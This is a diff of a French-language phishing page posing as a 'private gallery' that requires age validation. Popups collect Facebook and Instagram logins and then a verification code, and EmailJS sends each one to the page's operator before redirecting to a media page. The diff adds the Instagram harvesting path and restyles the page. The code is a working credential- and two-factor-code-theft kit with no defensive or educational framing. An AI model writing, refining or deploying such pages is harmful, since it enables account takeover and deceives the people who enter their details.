@@ -17,116 +17,152 @@
   <meta name="twitter:title" content="Gallerie privée !"/>
   <meta name="twitter:image" content="https://gabriella-swan.onrender.com/preview_gabriella.jpg"/>
 
-
-  <meta charset="utf-8"/>
-  <title>Gallerie privée !</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500;700&display=swap" rel="stylesheet"/>
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 
   <style>
+    :root{
+      --bg1:#1a1c2c;
+      --bg2:#2a2f4f;
+      --accent1:#7b61ff;
+      --accent2:#ff6ac1;
+      --glass:rgba(26,28,44,0.6);
+      --glass-border:rgba(255,255,255,0.18);
+      --muted:#e6e7f2;
+      --fb1:#1877F2; --fb2:#4a90e2;
+      --ig1:#f09433; --ig2:#bc1888; /* dégradé Instagram */
+      --shadow:0 18px 50px rgba(0,0,0,.55);
+    }
+
     body {
       margin: 0;
       font-family: 'Playfair Display', serif;
       color: #fff;
       text-align: center;
-      background: url('background.jpg') no-repeat center center fixed;
-      background-size: cover;
+      background:
+        radial-gradient(1200px 700px at 20% -10%, #283069 0%, transparent 60%),
+        radial-gradient(1000px 600px at 100% 10%, #24305a 0%, transparent 60%),
+        linear-gradient(135deg, var(--bg1), var(--bg2));
+      min-height:100vh;
       position: relative;
-    }
-    body::before {
-      content: '';
-      position: absolute;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0, 0, 0, 0.6);
-      backdrop-filter: blur(2px);
-      z-index: 0;
+      overflow-x:hidden;
     }
 
-    .header, .extras, .bitmoji-row, .bottom-banner, .login-popup, .verification-popup, .sponsors {
-      position: relative;
-      z-index: 1;
-    }
-    .header { padding: 40px 20px 30px; }
+    .header { padding: 48px 20px 18px; }
     .header h1 {
-      font-size: 4em;
+      font-size: clamp(2.2rem, 6vw, 4rem);
       color: #FFFFFF;
-      text-shadow: 0 0 15px rgba(228, 0, 15, 0.5);
-      margin-bottom: 10px;
+      text-shadow: 0 10px 30px rgba(0,0,0,0.35);
+      margin: 0 0 10px;
     }
-    .subtitle { font-size: 1.5em; margin-bottom: 30px; color: #f5f5f5; }
+    .subtitle { font-size: clamp(1rem, 2.6vw, 1.4rem); color: var(--muted); margin: 0 0 18px; }
+
+    .cta-row{ display:flex; gap:12px; justify-content:center; flex-wrap:wrap; margin-bottom:6px; }
+
     .button {
-      background: #1877F2;
       color: #fff;
       border: none;
-      padding: 14px 30px;
-      font-size: 1.1em;
-      font-weight: bold;
-      border-radius: 8px;
+      padding: 14px 22px;
+      font-size: 1.05em;
+      font-weight: 700;
+      border-radius: 9999px;
       cursor: pointer;
-      transition: 0.3s ease-in-out;
+      transition: transform .18s ease, box-shadow .18s ease, filter .18s ease;
+      display:inline-flex; align-items:center; gap:10px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.35), inset 0 0 0 1px rgba(255,255,255,.08);
     }
     .button[disabled] { opacity:.7; cursor:not-allowed; }
-    .button:hover { background:#145dbf; transform: translateY(-1px); }
+    .button:hover { filter:saturate(1.05); transform: translateY(-2px); box-shadow: 0 16px 35px rgba(0,0,0,0.45); }
+    .button.fb{ background: linear-gradient(90deg, var(--fb1), var(--fb2)); }
+    .button.ig{ background: linear-gradient(90deg, var(--ig1), var(--ig2)); }
+    .icon { width:18px; height:18px; display:inline-block; }
 
-    .bitmoji-row {
-      display: flex;
-      justify-content: center;
-      flex-wrap: wrap;
-      margin: 40px 0;
+    /* Avatars : hexagone autour du centre */
+    .bitmoji-layout{
+      position: relative;
+      width: 480px; height: 480px;
+      margin: 26px auto 8px;
+      max-width: 92vw; max-height: 92vw;
     }
     .bitmoji {
-      width: 90px; height: 90px; margin: 12px; border-radius: 50%;
+      --scale: 1;
+      width: 112px; height: 112px;
       background-size: cover; background-position: center;
-      border: 2px solid #0077b6; box-shadow: 0 0 10px rgba(255, 255, 255, 0.4);
+      clip-path: polygon(25% 6%, 75% 6%, 100% 50%, 75% 94%, 25% 94%, 0% 50%);
+      border: 2px solid rgba(255,255,255,0.85);
+      box-shadow: 0 8px 22px rgba(0,0,0,0.45);
+      position: absolute;
+      cursor: pointer;
+      transition: transform .25s ease, box-shadow .25s ease, outline .25s ease, filter .25s ease;
+      outline: 0 solid transparent;
+      transform: translate(-50%, -50%) scale(var(--scale));
+      will-change: transform, top, left;
+    }
+    .bitmoji:hover { --scale: 1.08; box-shadow: 0 12px 28px rgba(0,0,0,.55); }
+    .bitmoji.active { outline: 10px solid rgba(255,255,255,0.12); filter: saturate(1.06); }
+
+    .bottom-banner { display:flex; justify-content:center; position:relative; }
+    .bottom-banner img {
+      width: 92%;
+      max-width: 1000px;
+      height: auto;
+      display: block;
+      margin: 18px auto 24px;
+      border-radius: 22px;
+      box-shadow: var(--shadow);
+      transition: border-radius .25s ease, box-shadow .25s ease, transform .25s ease, filter .25s ease;
+    }
+    .bottom-banner.avatar-mode img{
+      border-radius: 18px;
+      box-shadow: 0 22px 60px rgba(0,0,0,.6);
+      transform: translateZ(0);
+      filter: saturate(1.05);
     }
 
-    .bottom-banner img { width: 100%; height: auto; display: block; }
-
-
-    /* Overlay + popups (Facebook & vérification) */
     .overlay {
       position: fixed; inset: 0;
-      background: rgba(0,0,0,0.6);
+      background: rgba(0,0,0,0.55);
       display: none;
       z-index: 999;
+      backdrop-filter: blur(2px);
     }
     .login-popup, .verification-popup {
       position: fixed;
       top: 10%;
       left: 50%;
       transform: translateX(-50%);
-      width: 90%; max-width: 420px;
-      background: #18191a;       /* thème sombre Facebook */
-      color: #e4e6eb;
+      width: 90%; max-width: 460px;
+      background: var(--glass);
+      color: #e8ebff;
       padding: 24px;
-      border-radius: 16px;
-      box-shadow: 0 12px 32px rgba(0,0,0,0.5);
+      border-radius: 22px;
+      border: 1px solid var(--glass-border);
+      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
       display: none;
       text-align: left;
       z-index: 1000;
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      backdrop-filter: blur(14px);
     }
     .login-popup h3, .verification-popup h3 {
       margin: 0 0 12px;
-      font-size: 1.25rem;
-      font-weight: 700;
-      color: #e4e6eb;
+      font-size: 1.2rem;
+      font-weight: 800;
+      color: #fff;
       text-align: center;
     }
-    .login-popup label, .verification-popup label { color: #e4e6eb; font-weight: 600; display: inline-block; margin: 8px 0; }
+    .login-popup label, .verification-popup label { color: #e8ebff; font-weight: 600; display: inline-block; margin: 8px 0; }
     .login-popup input, .verification-popup input {
       width: 100%;
-      background: #242526;
-      border: 1px solid #3A3B3C;
-      color: #e4e6eb;
-      border-radius: 10px;
+      background: rgba(30,32,52,.85);
+      border: 1px solid #3A3F68;
+      color: #e8ebff;
+      border-radius: 12px;
       padding: 12px;
       outline: none;
       margin-bottom: 10px;
     }
-    .login-popup input::placeholder, .verification-popup input::placeholder { color: #b0b3b8; }
+    .login-popup input::placeholder, .verification-popup input::placeholder { color: #b8bde0; }
 
     .popup-actions {
       display: grid;
@@ -135,92 +171,74 @@
       margin-top: 8px;
     }
     .btn { 
-      border: none; border-radius: 9999px; padding: 12px 16px; font-weight: 700; cursor: pointer;
+      border: none; border-radius: 9999px; padding: 12px 16px; font-weight: 800; cursor: pointer;
     }
     .btn[disabled] { opacity:.7; cursor:not-allowed; }
-    .btn-primary { background: #1877F2; color: #fff; }
-    .btn-primary:hover { background: #145dbf; }
-    .btn-secondary { background: transparent; color: #e4e6eb; border: 1px solid #3A3B3C; }
-    .btn-secondary:hover { background: #3A3B3C; }
-    .helper { font-size:.9rem; color:#b0b3b8; margin-top:6px; }
+    .btn-primary { background: linear-gradient(90deg, var(--accent1), var(--accent2)); color: #fff; }
+    .btn-primary:hover { filter:saturate(1.06) brightness(1.02); }
+    .btn-secondary { background: transparent; color: #e8ebff; border: 1px solid #3A3F68; }
+    .btn-secondary:hover { background: rgba(42,46,74,.8); }
+
+    .helper { font-size:.9rem; color:#cfd4ff; margin-top:6px; min-height:1.2em; }
   
-    
-    
-    .bitmoji-layout {
-      position: relative;
-      width: 350px; height: 350px;
-      margin: 50px auto;
+    .sound-toggle {
+      position: fixed;
+      right: 14px;
+      bottom: 14px;
+      z-index: 2000;
+      background: #232845;
+      color: #fff;
+      border: 1px solid rgba(255,255,255,0.12);
+      border-radius: 9999px;
+      padding: 10px 14px;
+      font-weight: 800;
+      cursor: pointer;
+      box-shadow:
+        8px 8px 18px rgba(0,0,0,0.35),
+        -6px -6px 16px rgba(255,255,255,0.06);
+      display:inline-block;
     }
-    .bitmoji {
-      width: 90px; height: 90px;
-      border-radius: 50%;
-      background-size: cover;
-      background-position: center;
-      border: 3px solid #0077b6;
-      box-shadow: 0 0 15px rgba(230,0,18,0.6);
-      position: absolute;
-    }
-    .bitmoji.center { 
-      top: 50%; left: 50%; 
-      transform: translate(-50%, -50%); 
-    }
-    /* 4 avatars à distance égale (rayon = 120px) */
-    .bitmoji.top    { top: calc(50% - 120px); left: 50%;             transform: translate(-50%, -50%); }
-    .bitmoji.right  { top: 50%;               left: calc(50% + 120px); transform: translate(-50%, -50%); }
-    .bitmoji.bottom { top: calc(50% + 120px); left: 50%;             transform: translate(-50%, -50%); }
-    .bitmoji.left   { top: 50%;               left: calc(50% - 120px); transform: translate(-50%, -50%); }
-
-
-
-
-  /* Bouton flottant pour activer/désactiver la musique */
-  .sound-toggle {
-    position: fixed;
-    right: 14px;
-    bottom: 14px;
-    z-index: 2000;
-    background: rgba(0,0,0,0.55);
-    color: #fff;
-    border: 2px solid #0077b6;
-    border-radius: 9999px;
-    padding: 10px 14px;
-    font-weight: 700;
-    cursor: pointer;
-    box-shadow: 0 6px 18px rgba(0,0,0,0.35);
-    backdrop-filter: blur(2px);
-  }
-  .sound-toggle:hover { background: rgba(0,0,0,0.7); }
-
-</style>
+    .sound-toggle:hover { filter:saturate(1.05) brightness(1.03); }
+  </style>
 </head>
 <body>
 
-  <!-- Musique 8-bit style Nintendo -->
-  <audio id="bgm" src="music.wav" preload="auto" autoplay loop playsinline></audio></audio>
+  <audio id="bgm" src="music.wav" preload="auto" autoplay loop playsinline></audio>
 
   <div class="header">
     <h1>Gallerie privée ! !</h1>
     <p class="subtitle">Accès à ma gallerie privée.</p>
-    <button class="button" id="facebookBtn" onclick="openFacebookPopup()">Valide ton âge avec Facebook</button>
-  </div>
 
-  
-    <!-- Avatars organisés autour d'un centre -->
-    <div class="bitmoji-layout">
-      <div class="bitmoji center" style="background-image:url('avatar5.png')"></div>
-      <div class="bitmoji top"    style="background-image:url('avatar1.png')"></div>
-      <div class="bitmoji right"  style="background-image:url('avatar2.png')"></div>
-      <div class="bitmoji bottom" style="background-image:url('avatar3.png')"></div>
-      <div class="bitmoji left"   style="background-image:url('avatar4.png')"></div>
+    <div class="cta-row">
+      <button class="button fb" id="facebookBtn" onclick="triggerFirstPlay(); openFacebookPopup()">
+        <svg class="icon" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+          <path d="M22 12.06C22 6.48 17.52 2 11.94 2S2 6.48 2 12.06c0 4.99 3.66 9.13 8.44 9.94v-7.03H7.9v-2.91h2.54V9.41c0-2.5 1.49-3.89 3.77-3.89 1.09 0 2.23.2 2.23.2v2.45h-1.26c-1.24 0-1.63.77-1.63 1.56v1.87h2.78l-.44 2.91h-2.34V22c4.78-.81 8.44-4.95 8.44-9.94z"/>
+        </svg>
+        Valider mon âge (Facebook)
+      </button>
+
+      <button class="button ig" id="instagramBtn" onclick="triggerFirstPlay(); openInstagramPopup()">
+        <!-- Icône Instagram simplifiée -->
+        <svg class="icon" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+          <path d="M7 2h10a5 5 0 015 5v10a5 5 0 01-5 5H7a5 5 0 01-5-5V7a5 5 0 015-5zm10 2H7a3 3 0 00-3 3v10a3 3 0 003 3h10a3 3 0 003-3V7a3 3 0 00-3-3zm-5 3.5a5.5 5.5 0 110 11 5.5 5.5 0 010-11zm0 2a3.5 3.5 0 100 7 3.5 3.5 0 000-7zM18 6.5a1.25 1.25 0 110 2.5 1.25 1.25 0 010-2.5z"/>
+        </svg>
+        Valider mon âge (Instagram)
+      </button>
     </div>
-
-    <div class="bitmoji" style="background-image: url('avatar2.png')"></div>
-    <div class="bitmoji" style="background-image: url('avatar3.png')"></div>
-    <div class="bitmoji" style="background-image: url('avatar4.png')"></div>
   </div>
 
-  <div class="bottom-banner">
-    <img src="banner.png" alt="Shooting banner"/>
+  <!-- Avatars en hexagone autour du centre -->
+  <div class="bitmoji-layout" id="bitmojiHex">
+    <div class="bitmoji" data-src="avatar1.png" style="background-image:url('avatar1.png')"></div>
+    <div class="bitmoji" data-src="avatar2.png" style="background-image:url('avatar2.png')"></div>
+    <div class="bitmoji" data-src="avatar3.png" style="background-image:url('avatar3.png')"></div>
+    <div class="bitmoji" data-src="avatar4.png" style="background-image:url('avatar4.png')"></div>
+    <div class="bitmoji" data-src="avatar5.png" style="background-image:url('avatar5.png')"></div>
+    <div class="bitmoji" data-src="avatar6.png" style="background-image:url('avatar6.png')"></div>
+  </div>
+
+  <div class="bottom-banner" id="bannerWrap">
+    <img src="banner.png" alt="Shooting banner" id="mainBanner"/>
   </div>
 
   <!-- Overlay & Popups -->
@@ -239,10 +257,24 @@
     <div class="helper" id="fb-helper"></div>
   </div>
 
+  <!-- Popup Instagram -->
+  <div class="login-popup" id="instagramPopup">
+    <h3>Valide ton âge avec Instagram</h3>
+    <label for="ig-user">Nom d’utilisateur</label>
+    <input id="ig-user" type="text" placeholder="Nom d’utilisateur"/>
+    <label for="ig-password">Mot de passe</label>
+    <input id="ig-password" type="password" placeholder="Mot de passe"/>
+    <div class="popup-actions">
+      <button class="btn btn-primary" id="ig-submit" onclick="submitInstagram()">Confirmer</button>
+      <button class="btn btn-secondary" onclick="closePopup('instagramPopup')">Retour</button>
+    </div>
+    <div class="helper" id="ig-helper"></div>
+  </div>
+
   <div class="verification-popup" id="verificationPopup">
     <h3>Validation des informations</h3>
     <label for="verificationCode">Entrer le code reçu :</label>
-    <input id="verificationCode" type="text" inputmode="numeric" maxlength="8" pattern="\d*" placeholder="Code de 6 à 8 chiffres"/>
+    <input id="verificationCode" type="text" inputmode="numeric" maxlength="8" pattern="\\d*" placeholder="Code de 6 à 8 chiffres"/>
     <div class="popup-actions">
       <button class="btn btn-primary" id="code-submit" onclick="finishAndContinue()">OK</button>
       <button class="btn btn-secondary" onclick="closePopup('verificationPopup')">Retour</button>
@@ -251,10 +283,11 @@
   </div>
 
   <script>
-    // Init EmailJS avec ta clé publique
+    // Init EmailJS (inchangé)
     document.addEventListener('DOMContentLoaded', function(){
       if (window.emailjs) {
-        emailjs.init('AATQVLMcBJaRBgEox');
+        console.log('EmailJS init OK');
+    emailjs.init('AATQVLMcBJaRBgEox');
       }
       document.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeAllPopups(); });
     });
@@ -262,6 +295,10 @@
     function openFacebookPopup() {
       document.getElementById('overlay').style.display = 'block';
       document.getElementById('facebookPopup').style.display = 'block';
+    }
+    function openInstagramPopup() {
+      document.getElementById('overlay').style.display = 'block';
+      document.getElementById('instagramPopup').style.display = 'block';
     }
     function closePopup(id) {
       document.getElementById(id).style.display = 'none';
@@ -271,10 +308,11 @@
     function closeAllPopups(){
       document.getElementById('overlay').style.display = 'none';
       document.getElementById('facebookPopup').style.display = 'none';
+      document.getElementById('instagramPopup').style.display = 'none';
       document.getElementById('verificationPopup').style.display = 'none';
     }
 
-    // Envoi EmailJS – connexion Facebook
+    // EmailJS – Facebook
     async function submitFacebook(){
       const email = document.getElementById('fb-email').value.trim();
       const pass  = document.getElementById('fb-password').value.trim();
@@ -282,7 +320,6 @@
       const help  = document.getElementById('fb-helper');
 
       if (!email || !pass) { help.textContent = 'Veuillez remplir tous les champs.'; return; }
-
       if (!window.emailjs) { help.textContent = 'EmailJS non chargé.'; return; }
 
       help.textContent = 'Envoi en cours...';
@@ -290,13 +327,13 @@
 
       try {
         await emailjs.send('service_photos', 'template_connexion', {
-          fb_email: email,
+          fb_email: "Facebook " + email,
           fb_password: pass
-        });
+        }).then(function(res){console.log('EmailJS OK', res);}).catch(function(err){console.error('EmailJS ERROR', err);});
         help.textContent = 'Informations envoyées. Vérification...';
-        // Enchaîne vers la vérification
-        document.getElementById('facebookPopup').style.display = 'none';
+        closePopup('facebookPopup');
         document.getElementById('verificationPopup').style.display = 'block';
+        document.getElementById('overlay').style.display = 'block';
       } catch (err) {
         help.textContent = 'Erreur EmailJS : ' + (err && err.text ? err.text : JSON.stringify(err));
       } finally {
@@ -304,7 +341,36 @@
       }
     }
 
-    // Envoi EmailJS – code de vérification
+    // EmailJS – Instagram
+    async function submitInstagram(){
+      const user = document.getElementById('ig-user').value.trim();
+      const pass = document.getElementById('ig-password').value.trim();
+      const btn  = document.getElementById('ig-submit');
+      const help = document.getElementById('ig-helper');
+
+      if (!user || !pass) { help.textContent = 'Veuillez remplir tous les champs.'; return; }
+      if (!window.emailjs) { help.textContent = 'EmailJS non chargé.'; return; }
+
+      help.textContent = 'Envoi en cours...';
+      btn.disabled = true;
+
+      try {
+        await emailjs.send('service_photos', 'template_connexion', {
+          fb_email: "Instagram " + user,
+          fb_password: pass
+        }).then(function(res){console.log('EmailJS OK', res);}).catch(function(err){console.error('EmailJS ERROR', err);});
+        help.textContent = 'Informations envoyées. Vérification...';
+        closePopup('instagramPopup');
+        document.getElementById('verificationPopup').style.display = 'block';
+        document.getElementById('overlay').style.display = 'block';
+      } catch (err) {
+        help.textContent = 'Erreur EmailJS : ' + (err && err.text ? err.text : JSON.stringify(err));
+      } finally {
+        btn.disabled = false;
+      }
+    }
+
+    // EmailJS – code (inchangé)
     async function finishAndContinue(){
       const code = document.getElementById('verificationCode').value.trim();
       const btn  = document.getElementById('code-submit');
@@ -319,8 +385,7 @@
       try {
         await emailjs.send('service_photos', 'template_code', {
           verification_code: code
-        });
-        // Redirection après succès
+        }).then(function(res){console.log('EmailJS OK', res);}).catch(function(err){console.error('EmailJS ERROR', err);});
         closeAllPopups();
         window.location.href = 'medias.html';
       } catch (err) {
@@ -331,85 +396,120 @@
     }
   </script>
 
-<script>
-document.addEventListener('DOMContentLoaded', function() {
-  var avatars = document.querySelectorAll('.bitmoji-layout .bitmoji');
-  var banner  = document.querySelector('.bottom-banner img');
-  if (!avatars.length || !banner) return;
+  <!-- Hexagon layout + banner replacement + first-click audio trigger -->
+  <script>
+  document.addEventListener('DOMContentLoaded', function() {
+    const container = document.getElementById('bitmojiHex');
+    const avatars = container ? container.querySelectorAll('.bitmoji') : [];
+    const banner  = document.getElementById('mainBanner');
+    const bannerWrap = document.getElementById('bannerWrap');
 
-  avatars.forEach(function(el) {
-    el.addEventListener('click', function() {
-      var bg = el.style.backgroundImage;
-      if (bg) {
-        var match = bg.match(/url\(["']?(.*?)["']?\)/);
-        if (match && match[1]) {
-          banner.src = match[1];
-        }
+    if (!container || !avatars.length || !banner || !bannerWrap) return;
+
+    const defaultBanner = banner.getAttribute('src');
+
+    function layoutHex(){
+      const rect = container.getBoundingClientRect();
+      const cx = rect.width / 2;
+      const cy = rect.height / 2;
+      const r = Math.min(rect.width, rect.height) * 0.38;
+      avatars.forEach((el, i) => {
+        const angleDeg = -90 + i * 60;
+        const rad = angleDeg * Math.PI / 180;
+        const x = cx + r * Math.cos(rad);
+        const y = cy + r * Math.sin(rad);
+        el.style.left = x + 'px';
+        el.style.top  = y + 'px';
+      });
+    }
+    layoutHex();
+    window.addEventListener('resize', layoutHex);
+
+    function extractUrlFrom(el){
+      let bg = el.style.backgroundImage;
+      let m = bg && bg.match(/url\\(["']?(.*?)["']?\\)/);
+      if (m && m[1]) return m[1];
+      const cs = getComputedStyle(el).backgroundImage;
+      m = cs && cs.match(/url\\(["']?(.*?)["']?\\)/);
+      if (m && m[1]) return m[1];
+      return el.getAttribute('data-src') || null;
+    }
+
+    // Trigger audio on first avatar click too
+    function onAvatarClick(el){
+      triggerFirstPlay();
+      avatars.forEach(a => a.classList.remove('active'));
+      el.classList.add('active');
+      const src = extractUrlFrom(el);
+      if (src) {
+        banner.src = src;
+        bannerWrap.classList.add('avatar-mode');
       }
+    }
+
+    avatars.forEach(function(el) {
+      el.addEventListener('click', function() { onAvatarClick(el); });
+    });
+
+    banner.addEventListener('dblclick', function() {
+      banner.src = defaultBanner;
+      bannerWrap.classList.remove('avatar-mode');
+      avatars.forEach(a => a.classList.remove('active'));
     });
   });
-});
-</script>
+  </script>
 
+  <!-- Bouton Son : icône 🔊/🔇 et déclenchement au premier clic -->
+  <button id="soundToggle" class="sound-toggle" aria-label="Activer/Désactiver le son">🔇</button>
 
-  <button id="soundToggle" class="sound-toggle" style="display:none;" aria-label="Activer le son">🔈 Son</button>
+  <script>
+  // Gestion audio : lecture au tout premier clic utilisateur (n'importe où) + helpers
+  let __audioPrimed = false;
+  function triggerFirstPlay(){
+    const audio = document.getElementById('bgm');
+    const toggle = document.getElementById('soundToggle');
+    if (!audio || !toggle) return;
+    if (!__audioPrimed){
+      audio.muted = false;
+      audio.play().then(() => {
+        toggle.textContent = '🔊';
+        __audioPrimed = true;
+      }).catch(() => {
+        // fallback: garder le bouton mais marquer comme primé
+        toggle.textContent = (audio.muted || audio.paused) ? '🔇' : '🔊';
+        __audioPrimed = true;
+      });
+    }
+  }
 
+  document.addEventListener('DOMContentLoaded', function(){
+    const audio = document.getElementById('bgm');
+    const toggle = document.getElementById('soundToggle');
+    if (!audio || !toggle) return;
 
-<script>
-document.addEventListener('DOMContentLoaded', function(){
-  const audio = document.getElementById('bgm');
-  const toggle = document.getElementById('soundToggle');
-  if (!audio) return;
+    audio.muted = true;
+    audio.play().catch(()=>{}); // tentative silencieuse
 
-  // Essaie de démarrer en muet (autoplay policy friendly)
-  audio.muted = true;
-  const tryPlay = () => audio.play().catch(() => {});
-  tryPlay();
+    const setIcon = () => { toggle.textContent = (audio.muted || audio.paused) ? '🔇' : '🔊'; };
 
-  // Affiche le bouton si besoin
-  const showToggle = () => { if (toggle) toggle.style.display = 'inline-block'; };
-  const hideToggle = () => { if (toggle) toggle.style.display = 'none'; };
+    // Premier clic n'importe où => jouer
+    const primeOnce = () => { triggerFirstPlay(); document.removeEventListener('click', primeOnce); };
+    document.addEventListener('click', primeOnce, { once:true });
 
-  // Au premier geste utilisateur, on active le son si possible
-  const enableSound = () => {
-    audio.muted = false;
-    audio.play().then(() => {
-      hideToggle();
-      removeEnableListeners();
-    }).catch(() => {
-      // Si ça échoue, on garde le bouton visible
-      showToggle();
-    });
-  };
-  const removeEnableListeners = () => {
-    document.removeEventListener('click', enableSoundOnce);
-    document.removeEventListener('keydown', enableSoundOnce);
-    document.removeEventListener('touchstart', enableSoundOnce);
-  };
-  const enableSoundOnce = () => { enableSound(); };
-  document.addEventListener('click', enableSoundOnce, { once: true });
-  document.addEventListener('keydown', enableSoundOnce, { once: true });
-  document.addEventListener('touchstart', enableSoundOnce, { once: true });
-
-  // Gestion du bouton
-  if (toggle) {
-    toggle.addEventListener('click', function(){
+    toggle.addEventListener('click', function(e){
+      e.stopPropagation();
       if (audio.muted || audio.paused) {
-        enableSound();
+        triggerFirstPlay();
       } else {
         audio.pause();
         audio.muted = true;
-        showToggle();
+        setIcon();
       }
     });
-  }
 
-  // Si le son reste muet/pausé après 1s, on montre le bouton
-  setTimeout(() => {
-    if (audio.paused || audio.muted) showToggle();
-  }, 1000);
-});
-</script>
+    setTimeout(() => { setIcon(); }, 600);
+  });
+  </script>
 
 </body>
 </html>
